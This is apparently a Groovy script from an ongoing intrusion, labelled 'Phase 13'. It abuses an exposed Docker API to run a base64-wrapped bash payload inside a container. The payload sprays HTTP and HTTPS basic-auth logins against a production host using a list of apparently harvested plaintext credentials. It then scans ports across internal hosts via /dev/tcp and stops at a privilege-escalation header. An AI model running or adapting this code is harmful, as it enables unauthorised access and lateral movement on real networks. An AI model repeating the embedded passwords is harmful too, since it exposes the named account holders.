// Phase 13: HTTP auth brute PROD + final consolidation
dockerApi = "http://172.27.140.148:4243"
containerId = "5b32e909c295"

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(90000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

def bash = '''#!/bin/bash
echo "===== HTTP BASIC AUTH SPRAY PROD (172.27.141.24) ====="
for cred in \\
    "eduardo.cruz:xwMyIxfkZZaDNkFg" \\
    "jenkins:e6LBqIkOI\\$PR1XX2oia" \\
    "jenkins:JenkisLegasy25" \\
    "jenkins-ng.dev.claroshop.com:dtvV50vwfGq5CO9" \\
    "admin:dtvV50vwfGq5CO9" \\
    "admin:JenkisLegasy25" \\
    "admin:admin" \\
    "adaxxidb:JTQ6PrkecY3y1kVN" \\
    "sophia-mrk-i:plug*spoke!MosqueCloud3col" \\
    "deploy:dtvV50vwfGq5CO9" \\
    "sears:sears" \\
    "claroshop:claroshop"
do
    user="${cred%%:*}"
    pass="${cred#*:}"
    code=$(curl -sS -k -m 3 -o /dev/null -w "%{http_code}" -u "$user:$pass" http://172.27.141.24/ 2>/dev/null)
    if [ "$code" != "401" ]; then
        echo "*** HTTP_AUTH_OK *** $user (code=$code)"
        curl -sS -k -m 3 -u "$user:$pass" http://172.27.141.24/ 2>&1 | head -30
        break
    else
        echo "HTTP_401|$user"
    fi
done

echo ""
echo "===== HTTPS SPRAY ====="
for cred in "eduardo.cruz:xwMyIxfkZZaDNkFg" "admin:dtvV50vwfGq5CO9" "jenkins:e6LBqIkOI\\$PR1XX2oia"; do
    user="${cred%%:*}"
    pass="${cred#*:}"
    code=$(curl -sS -k -m 3 -o /dev/null -w "%{http_code}" -u "$user:$pass" https://172.27.141.24/ 2>/dev/null)
    if [ "$code" != "401" ] && [ "$code" != "000" ]; then
        echo "*** HTTPS_OK *** $user (code=$code)"
    else
        echo "HTTPS|$user|$code"
    fi
done

echo ""
echo "===== FINAL TCP MATRIX (all hosts, key ports) ====="
for target in \\
    "172.27.141.24:22" "172.27.141.24:80" "172.27.141.24:443" "172.27.141.24:3306" "172.27.141.24:3308" \\
    "172.27.141.6:22" "172.27.141.6:3308" "172.27.141.6:80" "172.27.141.6:443" \\
    "172.27.141.4:22" "172.27.141.4:3306" "172.27.141.4:3310" "172.27.141.4:80" \\
    "172.27.141.5:22" "172.27.141.5:3306" \\
    "172.27.140.134:22" "172.27.140.134:3306" "172.27.140.134:3308" \\
    "172.27.140.141:9200" "172.27.140.162:9000"
do
    ip="${target%%:*}"
    port="${target#*:}"
    timeout 2 bash -c "echo > /dev/tcp/$ip/$port" 2>/dev/null && echo "OPEN|$target" || echo "CLOSED|$target"
done

echo ""
echo "===== DEV SEARS STORED PROC PRIVESC ====="
'''

def b64 = bash.getBytes("UTF-8").encodeBase64().toString()
def cmd = "echo " + b64 + " | base64 -d > /tmp/_p13.sh && bash /tmp/_p13.sh 2>&1; rm -f /tmp/_p13.sh"
println execIn(cmd)
